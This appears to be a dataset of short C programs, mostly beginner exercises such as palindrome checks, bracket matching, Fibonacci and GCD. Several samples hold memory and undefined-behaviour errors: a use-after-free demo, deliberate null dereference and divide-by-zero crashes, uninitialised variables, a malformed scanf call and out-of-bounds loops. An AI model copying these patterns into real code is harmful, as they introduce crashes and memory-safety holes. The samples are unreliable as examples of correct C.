    "int findnum (int *p, int len) {\n    int once = 0;\n    int twice = 0;\n    int i;\n    for (i = 0; i < len; i++) {\n        once = ~twice & (once ^ *(p + i));\n        twice = ~once & (twice ^ *(p + i));\n    }\n    return once;\n}\nint main() {\n    int input[10] = {10, 2, 4, 4, 2, 10, 94, 2, 4, 10};\n    return findnum(input, 10);\n}",
    "#include<stdio.h>\nint main()\n{\n    unsigned int num[100001]={0};\n    int n,a,i,k;\n    scanf(\"%d\",&n);\n    for(i=0;i<n;++i)\n    {\n        scanf(\"%d\",&a);\n        ++num[a];\n    }\n    scanf(\"%d\",&k);\n    for(i=100000;i>=0;--i)\n    {\n        if(num[i]!=0)\n        k--;\n        if(k<=0)\n        {\n            printf(\"%d %u\\n\",i,num[i]);\n            break;\n        }\n    }\n return 0;\n }",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n    int n, rem, temp, base, bin;\n    printf(\"Enter n : \");\n    scanf(\"%d\", &n);\n    printf(\"dec \\t bin\\n\");\n    for (int i = 1; i <= n; i++)\n    {\n        temp = i;\n        base = 1;\n        bin = 0;\n        while (temp != 0)\n        {\n            rem = temp % 2;\n            bin += rem * base;\n            base *= 10;\n            temp /= 2;\n        }\n        printf(\"%d \\t %d\\n\", i, bin);\n    }\n    return 0;\n}",
    "#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n_Bool isValid(char *s) {\n  int len = strlen(s);\n  if (0 == len) {\n    return 1;\n  }\n  if (len % 2 != 0) {\n    return 0;\n  }\n  char list[128] = {0};\n  int a = '(';\n  int b = '[';\n  int c = '{';\n  list[a] = ')';\n  list[b] = ']';\n  list[c] = '}';\n  int size = 0;\n  int *stack = (int *)malloc(sizeof(int) * len);\n  stack[size++] = *s++;\n  while (*s) {\n    if (*s == '(' || *s == '[' || *s == '{') {\n      stack[size++] = *s;\n    } else if (*s == ')' || *s == ']' || *s == '}') {\n      if (list[stack[size - 1]] == *s) {\n        --size;\n      }\n    } else {\n      continue;\n    }\n    ++s;\n  }\n  free(stack);\n  return !size;\n}\nint main() {\n  char *source = \"()\";\n  char *source1 = \"\";\n  char *source2 = \"{[]}\";\n  char *source3 = \"([)]\";\n  char *source4 = \"()[]{}\";\n  char *source5 = \"{[()]}\";\n  char *source6 = \"{[](){{[]}}}\";\n  printf(\"%d\\n\", isValid(source));\n  printf(\"%d\\n\", isValid(source1));\n  printf(\"%d\\n\", isValid(source2));\n  printf(\"%d\\n\", isValid(source3));\n  printf(\"%d\\n\", isValid(source4));\n  printf(\"%d\\n\", isValid(source5));\n  printf(\"%d\\n\", isValid(source6));\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int x;\n    printf(\"Masukan Lebar Persegi : \");\n    scanf(\"%x\", &x);\n    for(int j = 0; j <= x; j++){\n        printf(\"* \");\n    }\n    printf(\"\\n\");\n    for(int i = 0; i <= (x-2); i++){\n        printf(\"* \");\n        for(int j = 0; j <= (x-2); j++){\n            printf(\"  \");\n        }\n        printf(\"*\\n\");\n    }\n    for(int k = 0; k <= x; k++){\n        printf(\"* \");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int a = 12345;\n    unsigned b = 123456;\n    long c = 1234567;\n    unsigned long d = 12345678;\n    long long e = 1234567891011;\n    unsigned long long f = 123456789101112;\n    printf(\n        \"int a = %d\\n\"\n        \"unsigned b = %u\\n\"\n        \"long c = %ld\\n\"\n        \"unsigned long d = %lu\\n\"\n        \"long long e = %lld\\n\"\n        \"unsigned long long f = %llu\\n\"\n        , a, b, c, d, e, f);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint f(int n);\nint main() {\n    char *s1 = \"first\", *s2 = \"second\", s[] = \"program\";\n    strcpy(s + 4, s2 + 2);\n    strcpy(s + 6, s1 + 1);\n    puts(s);\n    return 0;\n}\nint f(int n) {\n    if (n == 1) return 1;\n    else return n*n + f(n - 1);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main (void)\n{\n  int x,y,z,cont,stop;\n  x=0;\n  y=1;\n  z=0;\n  printf(\"Cuantos numeros deseas:\");\n  scanf(\"%d,&stop\");\n  for (cont=0;cont<stop;cont++){\n   if(z==0 || z==1){\n    printf(\"%d\\n\",z);\n   }\n   z=x+y;\n   printf(\"%d\\n\",z);\n   x=y;\n   y=z;\n    }\n  getchar();\n  return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <stdbool.h>\n_Bool isPalindrome(int x){\n    if (x < 0) {\n        return 0;\n    }\n    int num = x;\n    long reverseInt = 0;\n    while (num > 0) {\n        reverseInt = reverseInt*10 + num%10;\n        num /= 10;\n    }\n    return reverseInt == x;\n}\nint main(int argc, const char * argv[]) {\n    printf(\"%d\\n\",isPalindrome(0));\n    printf(\"%d\\n\",isPalindrome(-121));\n    printf(\"%d\\n\",isPalindrome(12344321));\n    return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n    printf(\"ler raio e altura e responder custo\\n\");\n    float raio, altura, perimetro, areaAl, volume, custo;\n    printf(\"Digite o raio do cilindro em metros: \");\n    scanf(\"%f\", &raio);\n    printf(\"Digite a altura em metros: \");\n    scanf(\"%f\", &altura);\n    perimetro = 2 * 3.1415 * raio;\n    areaAl = perimetro * altura;\n    custo = areaAl * 100;\n    printf(\"O custo total foi de: %.2f\", custo);\n    return 0;\n}",
    "#include <stdlib.h>\nint main(){\n        int* a;\n        a = malloc(sizeof(int));\n        *a = 42;\n        free(a);\n        *a = 24;\n        return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid itoa (int n, char s[]);\nvoid reverse(char []);\nint main()\n{\n    int i = 3335;\n    char n [6];\n    itoa(i, n);\n    printf(\"%s \\n\", n);\n    return 0;\n}\nvoid itoa(int n, char s[])\n{\n    int i, sign;\n    if ((sign = n) <0)\n        n = -n;\n    i = 0;\n    do {\n        s[i++] = n % 10 + '0';\n    }\n    while ((n /= 10) > 0);\n    if (sign < 0)\n        s[i++] = '-';\n    s[i] = '\\0';\n    reverse(s);\n}\nvoid reverse(char s[])\n{\n    int c, i, j;\n    for (i = 0, j = strlen(s)-1; i < j; i++, j--)\n    {\n        c = s[i];\n        s[i] = s[j];\n        s[j] = c;\n    }\n}",
    "#include <stdio.h>\nunsigned rightrot(unsigned x, int n);\nint main(void)\n{\n    printf(\"%d\\n\", rightrot(37, 2));\n    return 0;\n}\nunsigned rightrot(unsigned x, int n)\n{\n    unsigned right, len, temp;\n    temp = x;\n    while (temp > 0)\n    {\n        temp = temp / 2;\n        len++;\n    }\n    for (int i = 0; i < n; i++)\n    {\n        right = x & 1;\n        if (right)\n            x = x | (1 << len);\n        x = x >> 1;\n    }\n    return x;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int ten = 10;\n    int two = 2;\n    printf(\"Doing it right: \");\n    printf(\"%d minus %d is %d\\n\", ten, two, ten - two);\n    printf(\"Doing it wrong: \");\n    printf(\"%d minus %d is %d\\n\", ten);\n    return 0;\n}",
    "#include <stdbool.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <string.h>\n\n\n_Bool exact_cover_16(char str[(3 * 3)]) {\n  uint16_t a = (1 << (3 * 3)) - 1;\n  for (size_t i = 0; i < (3 * 3); i++) {\n    if (str[i] != '.') {\n      a ^= 1 << (str[i] - 49);\n    }\n  }\n  return a == 0;\n}\n_Bool exact_cover_8(char str[(3 * 3)]) {\n  uint8_t a = (0xff);\n  _Bool has_9 = 0;\n  for (size_t i = 0; i < (3 * 3); i++) {\n    if (str[i] != '.') {\n      if (str[i] - 49 != 8) {\n        a ^= 1 << (str[i] - 49);\n      } else {\n        has_9 = 1;\n      }\n    }\n  }\n  return a == 0 && has_9;\n}\nint main(int argc, char const *argv[]) {\n  char str[] = \"123456789\";\n  printf(\"%s=%s\\n\", str, exact_cover_16(str) ? \"true\" : \"false\");\n  printf(\"%s=%s\\n\", str, exact_cover_8(str) ? \"true\" : \"false\");\n  return 0;\n}",
    "#include <stdio.h>\nint nat(int);\nint main () {\n int x=50;\n printf(\"The sum of first %d natural numbers is %d.\",x,nat(x));\n return 0;\n}\nint nat(int a) {\n if (a==1)\n  return 1;\n return (a+nat(a-1));\n}",
    "const int DIM1 = 3;\nconst int DIM2 = 4;\nint main() {\n  int x[DIM1][DIM2];\n  int i, j;\n  for (i = 0; i < DIM1; i++)\n    for(j = 0; j < DIM2; j++)\n      x[i][j] = i+j*i;\n}",
    "#include <stdio.h>\nint main(void){\n    int i;\n    for(i='A';i<='Z';i++){\n        printf(\"%d \", i);\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int n, i,store;\n    printf(\"Enter Number of Elements: \");\n    scanf(\"%d\",&n);\n    for(i=0; i<=n; ++i){\n        printf(\"Number %d =\",i);\n        scanf(\"%d\",&store);\n    }\n    return 0;\n}",
    "int main() {\n  int i = 0, j = 10;\n  int sum = 0;\n  while (i++ < --j) {\n    sum++;\n  }\n  i = 0;\n  j = 10;\n  while (i++ < j--) {\n    sum++;\n  }\n  return sum;\n}",
    "#include <stdio.h>\n\n\n\nfloat celsius_to_fahr(float celsius);\nint main()\n{\n    float celsius;\n    printf(\"Celsius | Fahr\\n\");\n    for (celsius = 300; celsius >= 0; celsius -= 20)\n        printf(\"%7.0f | %3.1f\\n\", celsius, celsius_to_fahr(celsius));\n    return 0;\n}\nfloat celsius_to_fahr(float celsius)\n{\n    return (9.0 * celsius) / 5.0 + 32.0;\n}",
    "#include<time.h>\n#include<stdio.h>\n#include<stdlib.h>\nint main(){\n    clock_t start, end;\n    start = clock();\n    int numeros[24998];\n    int insert;\n    for(int i=2;i < 25000;i++){\n        if(i != 0 && i != 1){\n            numeros[insert] = i;\n            insert = insert +1;\n        }\n    }\n    int s = ( sizeof(numeros) / sizeof(numeros[0]) );\n    int primo[2762] = {};\n    int count = 0;\n    for(int n=0;n < s;n++){\n        int mult = 0;\n        for(int j=2;j < numeros[n]+1;j++){\n            if(numeros[n] % j == 0){\n                mult = mult +1;\n            }\n        }\n        if(mult <= 1){\n            primo[count] = numeros[n];\n            count++;\n        }\n    }\n    end = clock();\n    double total_time = (end - start)/((clock_t)1000000000);\n    printf(\"%f\\n\", total_time);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nvoid input();\nint fngcd(long long a, long long b);\nint main(){\n  input();\n  return 0;\n}\nvoid input(){\n  long long ai, bi, ans;\n  scanf(\"%lld %lld\", &ai, &bi);\n  ans = fngcd(ai, bi);\n  printf(\"\\n%lld\", ans);\n}\nint fngcd(long long a, long long b){\n  long long rem;\n  if(b == 0){\n    return a;\n  }\n  else{\n    rem = a % b;\n    return fngcd(b,rem);\n  }\n}",
    "#include <stdio.h>\n#include <string.h>\nint main()\n{\n    char palavra[20];\n    int i, tamanho;\n        printf(\"\\nEntre com uma palavra: \");\n        scanf(\"%s\", palavra);\n        printf(\"\\n\");\n        tamanho = strlen(palavra);\n        for(i=tamanho-1; i>=0; i--)\n        {\n            printf(\"%c\", palavra[i]);\n        }\n        printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n   int i,j;\n   i = 21;\n   j = 56;\n   i &= j;\n   printf(\"i & j = %d\\n\", i);\n   i ^= j;\n   printf(\"i ^ j = %d\\n\", i);\n   i |= j;\n   printf(\"i | j = %d\\n\", i);\n   return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nvoid help(void)\n{\n    printf(\"crash [--help|--div0|--seg|--abt]\\n\");\n    printf(\"Generates a user specified crash.\\n\");\n    exit (0);\n}\nint main (int argc, char *argv[])\n{\n    if (argc == 1) {\n        help();\n    }\n    else if (strcmp(argv[1], \"--help\") == 0){\n        help();\n    }\n    else if (strcmp(argv[1], \"--div0\") == 0) {\n        int zero = 0;\n        int x = 1 / zero;\n        (void)x;\n    }\n    else if (strcmp(argv[1], \"--seg\") == 0) {\n        int *p = ((void*)0);\n        *p = 1;\n    }\n    else if (strcmp(argv[1], \"--abt\") == 0) {\n        abort();\n    }\n    else {\n        printf(\"Unknown option\\n\");\n        return 0;\n    }\n    return -1;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n, *ptr, i, flag = 0;\n    unsigned int size;\n    printf(\"Enter Size of array:\");\n    scanf(\"%u\", &size);\n    ptr = (int *)calloc(size, sizeof(int));\n    if (ptr != ((void*)0))\n    {\n        printf(\"\\nEnter Elements:\");\n        for (i = 0; i < size; i++)\n        {\n            scanf(\"%d\", &ptr[i]);\n        }\n    }\n    printf(\"\\nEnter Element to be searched:\");\n    scanf(\"%d\", &n);\n    for (i = 0; i < size; i++)\n    {\n        if (*(ptr + i) == n)\n            flag = 1;\n    }\n    if (flag == 1)\n        printf(\"\\nElement Found!!\");\n    else\n        printf(\"\\nElement Not Found!!\");\n    free(ptr);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main()\n{\n    char max[50] = {0};\n    char min[50] = {127};\n    char tmp[50];\n    for (int i = 0; i < 5; i++)\n    {\n        scanf(\"%s\", tmp);\n        if (strcmp(tmp, max) > 0)\n        {\n            strcpy(max, tmp);\n        }\n        if (strcmp(tmp, min) < 0)\n        {\n            strcpy(min, tmp);\n        }\n    }\n    printf(\"max:%s\\nmin:%s\\n\", max, min);\n    return 0;\n}",
    "#include <stdio.h>\nint temp;\nint main()\n{\n while(temp<20)\n {\n  temp++;\n }\n return 0;\n}",
    "#include <stdio.h>\n\nvoid subseq(int[], int, int *, int *);\nint main() {\n  int dim, arr[30], i, val, len;\n  scanf(\"%d\", &dim);\n  for (i = 0; i < dim; i++)\n    scanf(\"%d\", &arr[i]);\n  subseq(arr, dim, &val, &len);\n  printf(\"valore = %d, lunghezza = %d\\n\", val, len);\n}\nvoid subseq(int arr[], int dim, int *val, int *len) {\n  int i, tmpVal, tmpLen;\n  tmpVal = arr[0];\n  tmpLen = 1;\n  *val = arr[0];\n  *len = 1;\n  for (i = 1; i < dim; i++) {\n    if (arr[i] == tmpVal) {\n      tmpLen++;\n      if (tmpLen > *len) {\n        *val = tmpVal;\n        *len = tmpLen;\n      }\n    } else {\n      tmpVal = arr[i];\n      tmpLen = 1;\n    }\n  }\n}",
    "#include <stdio.h>\nstatic const int A [] = { 1, 2, 3, 4, 5, 6, 7, 8, 9 };\nstatic const int b [] = { 4, 7, 11 };\nstatic int c [3] = { 0 };\nint main (int argc, char **argv)\n{\n    for (int i = 0; i < 3; ++i)\n    {\n        for (int j = 0; j < 3; ++j)\n        {\n            c [i] += A [3 * i + j] * b [j];\n        }\n    }\n    printf (\"c = ( %d, %d, %d )^T\\n\", c [0], c [1], c [2]);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint var1;\nvoid check_stack();\nint main ()\n{\n    int var2 = 5;\n    void *p = malloc(128);\n    void *j = malloc(128);\n    char *s = \"Hello, World\";\n    printf (\"Address of main is %p\\n\", main);\n    printf (\"Address of var1 is %p\\n\", &var1);\n    printf (\"Address of var2 is %p\\n\", &var2);\n    check_stack();\n    printf (\"p points to %p\\n\", p);\n    printf (\"j points to %p\\n\", j);\n    printf (\"s points to %p\\n\", s);\n    void *m = malloc(10);\n    void *n = malloc(10);\n    printf (\"m points to %p\\n\", m);\n    printf (\"n points to %p\\n\", n);\n    return 0;\n}\nvoid check_stack(){\n  int a = 4;\n  printf(\"Address of local var a is %p\\n\", &a);\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <string.h>\nstatic inline int is_character(char c)\n{\n    return ((c >= 'a' && c <= 'z') ||\n            (c >= 'A' && c <= 'Z') ||\n            (c >= '0' && c <= '9'));\n}\nstatic inline int is_match(char a, char b)\n{\n    if (a >= 'A' && a <= 'Z')\n        a = a - 'A' + 'a';\n    if (b >= 'A' && b <= 'Z')\n        b = b - 'A' + 'a';\n    return a == b;\n}\n_Bool isPalindrome(char* s)\n{\n    int i = 0;\n    int j = strlen(s) - 1;\n    if (s == ((void*)0))\n    {\n        return 1;\n    }\n    while (i < j)\n    {\n        if (!is_character(s[i]))\n        {\n            i++;\n            continue;\n        }\n        if (!is_character(s[j]))\n        {\n            j--;\n            continue;\n        }\n        if (!is_match(s[i], s[j]))\n            return 0;\n        i++;\n        j--;\n    }\n    if (i < j)\n    {\n        return 0;\n    }\n    return 1;\n}\nint main(void)\n{\n    char str1[] = \"A man, a plan, a canal: Panama\";\n    char str2[] = \"race a car\";\n    char str3[] = \"aa\";\n    char str4[] = \"ab\";\n    char str5[] = \"a.\";\n    char str6[] = \"\";\n    printf(\"%d\\n\", isPalindrome(str1));\n    printf(\"%d\\n\", isPalindrome(str2));\n    printf(\"%d\\n\", isPalindrome(str3));\n    printf(\"%d\\n\", isPalindrome(str4));\n    printf(\"%d\\n\", isPalindrome(str5));\n    printf(\"%d\\n\", isPalindrome(str6));\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(){\n    int n[3];\n    int i;\n    for (i = 3 -1; i > -1; i--){\n        scanf(\"%d\", &n[i]);\n    }\n    for (i = 0; i < 3; i++){\n        printf(\"N[%d] = %d\\n\", i, n[i]);\n    }\n return 0;\n}",
    "#include <stdio.h>\nint main () {\n int i;\n double number, sum = 0.0;\n for (i=1; i<=10; ++i) {\n printf(\"Enter n %d: \", i);\n scanf(\"%lf\", &number);\n if (number < 0.0){\n break;\n }\n sum += number;\n }\n printf(\"Sum = %.2lf\", sum);\n return 0;\n}",
    "#include <locale.h>\n#include <stdio.h>\nvoid test(const char* name) {\n  locale_t loc = newlocale(0x7fffffff, name, 0);\n  if (loc)\n    printf(\"newlocale '%s' succeeded\\n\", name);\n  else\n    printf(\"newlocale '%s' failed\\n\", name);\n}\nint main(int argc, char* argv[]) {\n  test(\"C\");\n  test(\"waka\");\n  return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n printf(\"Sizes of built in data types in bytes: \");\n printf(\"\\nsizeof(int): %d\",sizeof(int));\n printf(\"\\nsizeof(short): %d\",sizeof(short));\n printf(\"\\nsizeof(long): %d\",sizeof(long));\n printf(\"\\nsizeof(float): %d\",sizeof(float));\n printf(\"\\nsizeof(double): %d\",sizeof(double));\n printf(\"\\nsizeof(long double): %d\",sizeof(long double));\n printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar * longestCommonPrefix(char ** strs, int strsSize);\nint main(){\n   char* str_1[3] = {\"flower\", \"flow\", \"floght\"};\n   char* test = longestCommonPrefix(str_1, 3);\n   printf(\"%s\\n\", test);\n   free(test);\n   char* str_2[3] = {\"dog\", \"racecar\", \"car\"};\n   char* test2 = longestCommonPrefix(str_2, 3);\n   printf(\"%s\\n\", test2);\n   free(test2);\n   char* str_3[1] = {\"car\"};\n   char* test3 = longestCommonPrefix(str_3, 1);\n   printf(\"%s\\n\", test3);\n   free(test3);\n   return 0;\n}\nchar * longestCommonPrefix(char ** strs, int strsSize){\n    char tmp;\n    int index=0;\n  for(index=0; index<strlen(*strs); index++){\n    for(int i=0; i<strsSize; i++){\n      printf(\"%d %c - %c\\n\",index, **(strs+i), *(*(strs+i)+index));\n      if(*(*strs+index) != *(*(strs+i)+index))\n        goto ret;\n    }\n  }\n  ret: ;\n  printf(\"index is [%d]\\n\", index);\n    char * res = (char*)malloc(sizeof(char)*(index+1));\n    res[index] = '\\0';\n    strncpy(res, *strs, index);\n    return res;\n}",
    "#include <stdio.h>\nint main(){\n    int golongan;\n    int pemakaian;\n    int tariff;\n    scanf(\"%d %d\", &golongan, &pemakaian);\n    tariff = golongan * 1000 * pemakaian;\n    tariff = pemakaian < 100 ? 100 * 1000 * golongan : pemakaian < 1000 ? pemakaian * 1000 * golongan : pemakaian * 1000 * golongan * 11 / 10;\n    printf(\"Golongan %d, pemakaian %d kWH, maka jumlah bayarnya %d\", golongan, pemakaian, tariff);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n int *arr=((void*)0);\n int num=1, i=0, j;\n arr = (int*)malloc(num*sizeof(int));\n if(arr==((void*)0))\n  exit(1);\n while(scanf(\"%d\", arr+i) != (-1))\n {\n  i++;\n  if (i==num)\n  {\n   int *a=((void*)0);\n   num*=2;\n   a = (int*)realloc(arr,num*sizeof(int));\n   if(arr==((void*)0))\n   {\n    free(arr);\n    exit(1);\n   }\n   else\n    arr = a;\n  }\n }\n for(j=i-1; j>=0; j--)\n  printf(\"%d \", arr[j]);\n printf(\"\\n\");\n free(arr);\n arr=((void*)0);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n    printf(\"hello world \\n\");\n    for (int i = 0; i < 5; ++i)\n    {\n        for (int j = i; j < 4; ++j)\n        {\n            printf(\"\u2211\");\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(){\n    int i,len;\n    char a[100];\n    printf(\"Enter\\n\");\n    scanf(\"%[^\\n]s\",a);\n    len=strlen(a);\n    for(i=0;i<len;i++){\n        if(i%2!=0||a[i]=='\\0'){\n            printf(\"%c%c\",a[i],a[i-1]);\n        }\n       else{\n       }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\nvoid print_message_function (void *ptr);\nint main()\n{\n    int tmp1, tmp2;\n    void *retval;\n    pthread_t thread1, thread2, thread3;\n    char *message1 = \"thread1\";\n    char *message2 = \"thread2\";\n    char *message3 = \"thread3\";\n    int ret_thrd1, ret_thrd2, ret_thrd3;\n    ret_thrd1 = pthread_create(&thread1, ((void*)0), (void *)&print_message_function, (void *) message1);\n    ret_thrd2 = pthread_create(&thread2, ((void*)0), (void *)&print_message_function, (void *) message2);\n    ret_thrd3 = pthread_create(&thread3, ((void*)0), (void *)&print_message_function, (void *) message3);\n    if (ret_thrd1 != 0) {\n        printf(\"\u7ebf\u7a0b1\u521b\u5efa\u5931\u8d25\\n\");\n    } else {\n        printf(\"\u7ebf\u7a0b1\u521b\u5efa\u6210\u529f\\n\");\n    }\n    if (ret_thrd2 != 0) {\n        printf(\"\u7ebf\u7a0b2\u521b\u5efa\u5931\u8d25\\n\");\n    } else {\n        printf(\"\u7ebf\u7a0b2\u521b\u5efa\u6210\u529f\\n\");\n    }\n    if (ret_thrd3 != 0) {\n        printf(\"\u7ebf\u7a0b3\u521b\u5efa\u5931\u8d25\\n\");\n    } else {\n        printf(\"\u7ebf\u7a0b3\u521b\u5efa\u6210\u529f\\n\");\n    }\n    while(1) {\n    }\n    tmp1 = pthread_join(thread1, &retval);\n    printf(\"thread1 return value(retval) is %d\\n\", (int)retval);\n    printf(\"thread1 return value(tmp) is %d\\n\", tmp1);\n    if (tmp1 != 0) {\n        printf(\"cannot join with thread1\\n\");\n    }\n    printf(\"thread1 end\\n\");\n    tmp2 = pthread_join(thread1, &retval);\n    printf(\"thread2 return value(retval) is %d\\n\", (int)retval);\n    printf(\"thread2 return value(tmp) is %d\\n\", tmp1);\n    if (tmp2 != 0) {\n        printf(\"cannot join with thread2\\n\");\n    }\n    printf(\"thread2 end\\n\");\n}\nvoid print_message_function( void *ptr ) {\n    int i = 0;\n    for (i; i<5; i++) {\n        printf(\"%s:%d\\n\", (char *)ptr, i);\n    }\n}",
    "#include <stdio.h>\nint main() {\n float a, b, c;\n scanf(\"%f %f %f\", &a, &b, &c);\n if(a < (b+c) && b < (a+c) && c < (b+a)) {\n  float perimetro;\n  perimetro = a+b+c;\n  printf(\"Perimetro = %.1f\\n\", perimetro);\n } else {\n  float area;\n  area = ((a+b)*c)/2;\n  printf(\"Area = %.1f\\n\", area);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\n\nint heitaKolikkoa();\nint main()\n{\n    int kolikko,i;\n    int kruunat=0,klaavat=0;\n    srand(time(((void*)0)));\n    for(i = 0; i < 100; i++)\n    {\n        kolikko = heitaKolikkoa();\n        if(kolikko == 1)\n        {\n            kruunat++;\n        }\n        else if (kolikko == 0)\n        {\n            klaavat++;\n        }\n    }\n    printf(\"Heittojen tulos: %d kruunua ja %d klaavaa\",kruunat,klaavat);\n}\nint heitaKolikkoa()\n{\n    int kolikko;\n    kolikko = rand() % 2;\n    return kolikko;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n    printf(\"Enter a random number from 1 to 5 for food items:\");\n  int choice=0;\n  scanf(\"%d\",&choice);\n  switch(choice)\n  {\n    case 1:\n      printf(\"Food item-Burger\\nPrice-Rs129\");\n      break;\n    case 2:\n      printf(\"Food item-Sandwich\\nPrice-Rs  149\");\n      break;\n    case 3:\n      printf(\"Food item-pizza\\nPrice-Rs 239\");\n      break;\n    case 4:\n      printf(\"Food item-pasta\\nPrice-Rs 179\");\n      break;\n    case 5:\n      printf(\"Food item -French Fries\\nPrice-Rs 99\");\n      break;\n    default:\n      printf(\"Invalid choice\");\n  }\n  return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\n\nint getLine(char s[], int lim){\n    int c,i;\n    for(i = 0;i<lim-1&&(c=getchar())!=(-1)&&c!='\\n';++i)\n        s[i] = c;\n    if(c == '\\n'){\n        s[i] = c;\n        ++i;\n    }\n    s[i] = '\\0';\n    return i;\n}\nint main(int argc,char *argv[]){\n    char line[1000];\n    int found = 0;\n    if(argc != 2){\n        printf(\"Usage: find pattern\\n\");\n    }\n    else{\n        while (getLine(line,1000)>0){\n            if(strstr(line,argv[1]) != ((void*)0)){\n                printf(\"%s\",line);\n                found++;\n            }\n        }\n    }\n    return found;\n}",
    "#include<stdio.h>\nint main()\n{\nint i,j,n;\nprintf(\"Enter the number of Data inputs: \");\nscanf(\"%d\",&n);\nfloat x[n],y[n],s=0,p,a;\nfor(i=0;i<n;i++)\n{\nprintf(\"\\nvalue of x[%d]: \",i);\nscanf(\"%f\",&x[i]);\nprintf(\"value of y[%d]: \",i);\nscanf(\"%f\",&y[i]);\n}\nprintf(\"\\nEnter the value of interpolation point: \");\nscanf(\"%f\",&a);\nfor(i=0;i<n;i++)\n{\np=1;\nfor(j=0;j<n;j++)\n{\nif(i!=j)\n{\np=p*((a-x[j])/(x[i]-x[j]));\n}\n}\ns=s+p*y[i];\n}\nprintf(\"Hence, the interpolated value at f(%.3f) is %f\",a,s);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\nint main()\n{\n setlocale(6,\"portuguese\");\n int qtd25=0, qtd50=0, qtd75=0, qtd100=0, x;\n printf(\"\\t- INTERVALOS -\\n\\n\");\n do{\n        printf(\"Digite um Valor: \");\n        scanf(\"%i\",&x);\n        if(x <= 25) qtd25++;\n        else if(x <= 50) qtd50++;\n        else if(x <= 75) qtd75++;\n        else qtd100++;\n }while(x>=0);\n printf(\"\\n0 - 25: %i\",qtd25);\n printf(\"\\n26 - 50: %i\",qtd50);\n printf(\"\\n51 - 75: %i\",qtd75);\n printf(\"\\n76 - 100: %i\\n\\n\",qtd100);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int a;\n    printf(\"Enter a\\n\");\n    scanf(\"%d\", &a);\n    (a<5)? printf(\"a is less than 5\") : printf(\"a is greater than 5\");\n    return 0;\n}",
    "#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\nvoid DFS(int** matrix, int nVertex, int nEdges, int vertex, _Bool* used)\n{\n    if (used[vertex])\n        return;\n    used[vertex] = 1;\n    for (int i = 0; i < nEdges; ++i) {\n        if (matrix[vertex][i] <= 0)\n            continue;\n        for (int j = 0; j < nVertex; ++j)\n            if (matrix[j][i] < 0)\n                DFS(matrix, nVertex, nEdges, j, used);\n    }\n}\nvoid findReachableVertex(int** matrix, int rowsSize, int columnsSize)\n{\n    _Bool* reachableVertex = calloc(rowsSize, sizeof(int));\n    for (int i = 0; i < rowsSize; i++)\n        reachableVertex[i] = 1;\n    for (int i = 0; i < rowsSize; i++) {\n        _Bool* used = calloc(rowsSize, sizeof(int));\n        DFS(matrix, rowsSize, columnsSize, i, used);\n        for (int j = 0; j < rowsSize; j++) {\n            if (!(reachableVertex[j] && used[j]))\n                reachableVertex[j] = 0;\n        }\n        free(used);\n    }\n    for (int i = 0; i < rowsSize; i++) {\n        if (reachableVertex[i])\n            printf(\"Reachable Vertex: %d\\n\", i);\n    }\n    free(reachableVertex);\n}\nint main()\n{\n    int rowsSize = 0;\n    int columnsSize = 0;\n    printf(\"Please enter nRows: \");\n    scanf(\"%d\", &rowsSize);\n    printf(\"Please enter nColumns: \");\n    scanf(\"%d\", &columnsSize);\n    int** matrix = calloc(rowsSize, sizeof(int*));\n    printf(\"Please enter a data( using Enter ):\\n\");\n    for (int i = 0; i < rowsSize; i++) {\n        matrix[i] = calloc(columnsSize, sizeof(int));\n        for (int j = 0; j < columnsSize; j++) {\n            scanf(\"%d\", &matrix[i][j]);\n        }\n    }\n    findReachableVertex(matrix, rowsSize, columnsSize);\n    for (int i = 0; i < rowsSize; i++) {\n        free(matrix[i]);\n    }\n    free(matrix);\n    return 0;\n}",
